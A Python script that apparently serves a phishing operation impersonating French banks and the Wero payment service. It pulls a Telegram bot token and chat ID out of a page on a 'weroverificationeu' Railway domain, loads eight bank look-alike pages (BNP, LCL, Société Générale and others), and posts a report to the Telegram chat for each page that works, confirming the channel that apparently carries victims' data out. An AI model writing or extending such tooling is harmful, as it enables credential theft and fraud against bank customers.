import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

# Banques a tester
BANKS = [
    "bred.html",
    "bnp.html",
    "lcl.html",
    "societe-generale.html",
    "credit-agricole.html",
    "credit-mutuel.html",
    "banque-populaire.html",
    "caisse-epargne.html",
]

print("=" * 70)
print("WERO TELEGRAM - MULTI-BANK TEST")
print("=" * 70)
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Step 1: Extract tokens
print("[1/3] Extracting Telegram tokens...")
response = requests.get(TEST_PAGE, timeout=10)

config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
match = re.search(config_pattern, response.text, re.DOTALL)

bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', match.group(1)).group(1)
chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', match.group(1)).group(1)

print(f"[OK] Tokens ready")
print()

# Step 2: Test each bank page
print("[2/3] Testing bank pages on Railway...")
print()

tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

failed = []
succeeded = []

for bank in BANKS:
    bank_url = f"{RAILWAY_URL}/{bank}"
    bank_name = bank.replace(".html", "").replace("-", " ").upper()
    
    try:
        # Check if page loads
        page_response = requests.get(bank_url, timeout=5)
        
        if page_response.status_code == 200:
            # Check if config is in page
            if "window.telegramConfig" in page_response.text or "TELEGRAM_BOT_TOKEN_PLACEHOLDER" not in page_response.text:
                # Send test to Telegram
                message = f"""PAGE TEST: {bank_name}
Status: ACCESSIBLE
URL: {bank_url}
Time: {datetime.now().strftime('%H:%M:%S')}"""
                
                payload = {"chat_id": chat_id, "text": message}
                tg_response = requests.post(tg_url, json=payload, timeout=5)
                
                if tg_response.json().get('ok'):
                    print(f"[OK] {bank_name}")
                    succeeded.append(bank_name)
                else:
                    print(f"[FAIL] {bank_name} - Telegram error")
                    failed.append(bank_name)
            else:
                print(f"[WARN] {bank_name} - Config not injected yet")
                failed.append(bank_name)
        else:
            print(f"[ERROR] {bank_name} - HTTP {page_response.status_code}")
            failed.append(bank_name)
    except Exception as e:
        print(f"[ERROR] {bank_name} - {str(e)[:40]}")
        failed.append(bank_name)

print()
print("[3/3] Summary")
print("=" * 70)
print(f"Success: {len(succeeded)}/{len(BANKS)}")
print(f"Failed: {len(failed)}/{len(BANKS)}")
print()

if succeeded:
    print("Working pages:")
    for bank in succeeded:
        print(f"  ✓ {bank}")

if failed:
    print()
    print("Pages to check:")
    for bank in failed:
        print(f"  ✗ {bank}")

print()
print("=" * 70)
print("All bank pages have been tested!")
print("Check your Telegram to see the test results.")
print("=" * 70)
